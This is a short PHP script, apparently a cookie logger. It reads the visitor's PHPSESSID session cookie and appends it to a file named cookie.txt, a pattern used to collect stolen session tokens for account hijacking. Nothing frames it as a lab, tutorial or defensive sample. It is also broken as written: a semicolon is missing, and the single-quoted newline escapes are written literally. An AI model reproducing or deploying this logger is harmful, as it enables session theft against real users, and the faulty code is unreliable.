<?php
$cookie = $_COOKIE['PHPSESSID']
$file = fopen ('cookie.txt','a');
fwrite ($file, $cookie. '\n\n');
?>
